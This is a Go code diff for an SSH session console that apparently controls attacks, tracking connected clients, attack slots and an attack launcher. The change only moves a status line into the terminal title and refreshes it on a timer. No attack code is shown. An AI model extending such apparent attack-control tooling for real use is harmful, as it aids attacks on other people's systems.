@@ -8,6 +8,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/crypto/ssh"
@@ -82,6 +83,7 @@ type Session struct {
 	ongoing  []attack
 	nextID   int
 	slots    []time.Time
+	titleMu  sync.Mutex
 }
 
 func New(channel ssh.Channel, theme prompt.Theme, user auth.User, hostname string, clients ClientLister, cast Broadcaster, attacks AttackCounter, totalSlots AttackCounter, launch AttackLauncher) *Session {
@@ -132,7 +134,7 @@ func (s *Session) activeOwn() int {
 	return n
 }
 
-func (s *Session) summary() string {
+func (s *Session) title() string {
 	total := 0
 	if s.clients != nil {
 		list := s.clients()
@@ -146,17 +148,36 @@ func (s *Session) summary() string {
 	if s.totalSlots != nil {
 		gSlots = s.totalSlots()
 	}
-	line := fmt.Sprintf("Connected: %d | Slot %d/%d | Global Slot %d/%d",
+	return fmt.Sprintf("Connected: %d | Slot %d/%d | Global Slot %d/%d",
 		total, own, s.slot, gActive, gSlots)
-	return s.theme.Gradient(line)
+}
+
+func (s *Session) setTitle() {
+	s.titleMu.Lock()
+	io.WriteString(s.channel, "\x1b]2;"+s.title()+"\x07")
+	s.titleMu.Unlock()
 }
 
 func (s *Session) Run() {
 	defer s.channel.Close()
 
 	s.clear()
-	s.print(s.summary())
-	s.print("")
+	s.setTitle()
+
+	stop := make(chan struct{})
+	defer close(stop)
+	go func() {
+		t := time.NewTicker(5 * time.Second)
+		defer t.Stop()
+		for {
+			select {
+			case <-t.C:
+				s.setTitle()
+			case <-stop:
+				return
+			}
+		}
+	}()
 
 	for {
 		io.WriteString(s.channel, s.prompt)
@@ -176,8 +197,7 @@ func (s *Session) Run() {
 		if cmd.Run(s, fields[1:]) {
 			return
 		}
-		s.print(s.summary())
-		s.print("")
+		s.setTitle()
 	}
 }
 
